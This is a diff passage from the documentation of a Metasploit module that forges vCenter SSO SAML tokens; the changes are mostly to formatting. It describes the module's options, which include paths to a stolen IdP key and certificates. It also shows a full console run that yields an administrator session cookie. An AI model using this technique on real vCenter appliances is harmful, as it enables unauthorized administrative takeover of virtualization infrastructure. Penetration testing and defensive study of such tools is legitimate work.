@@ -38,37 +38,37 @@ accordingly.
 12. Apply the acquired session cookie for the vCenter host at the `/ui` path
 
 ## Options
-**DOMAIN**
+### DOMAIN
 
 The vSphere SSO domain; by default this is `vsphere.local`. If this does not match the vSphere SSO
 domain, the module will return `HTTP 400: Issuer not trusted` on execution.
 
-**USERNAME**
+### USERNAME
 
 The target user within the SSO domain. This must be a valid user as vCenter will happily issue
 SAML assertions for invalid usernames, but the provided session tokens will not function. There
 should be no reason to modify the target user from the default `administrator` in most scenarios.
 
-**RHOSTS**
+### RHOSTS
 
 The vCenter appliance IPv4 address or DNS FQDN. This must be reachable over HTTPS for the module
 to function.
 
-**VHOST**
+### VHOST
 
 The fully qualified DNS name of the vCenter appliance; this must be present in the Issuer element
 of the assertion for the module to function. If this value does not match the vCenter appliance
 FQDN, the module will return `HTTP 400` during the initial `GET` request.
 
-**VC_IDP_CERT**
+### VC_IDP_CERT
 
 The filesystem path to the vCenter SSO IdP certificate in DER or PEM format.
 
-**VC_IDP_KEY**
+### VC_IDP_KEY
 
 The filesystem path to the vCenter SSO IdP private key in DER or PEM format.
 
-**VC_VMCA_CERT**
+### VC_VMCA_CERT
 
 The filesystem path to the vCenter VMCA certificate in DER or PEM format.
 
@@ -187,18 +187,18 @@ You should now have `idp.pem`, `idp.key`, and `vmca.pem` in your working directo
 Example run against vCenter appliance version 7.0 Update 3d:
 
 ```
-msf6 > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
+msf > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
 RHOSTS => 192.168.100.110
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
 VHOST => vcenter.cesium137.io
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
 VC_IDP_CERT => ~/idp.pem
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
 VC_IDP_KEY => ~/idp.key
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_VMCA_CERT ~/vmca.pem
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_VMCA_CERT ~/vmca.pem
 VC_VMCA_CERT => ~/vmca.pem
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > run
 [*] Running module against 192.168.100.110
 
 [+] Validated vCenter Single Sign-On IdP trusted certificate chain
@@ -210,7 +210,7 @@ msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
 [+] Got valid administrator session token!
 [+]     JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1; Path=/ui
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) >
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) >
 ```
 ### Using the Session Cookie
 Inject the acquired session cookie using the method of your choice. The cookie name must be
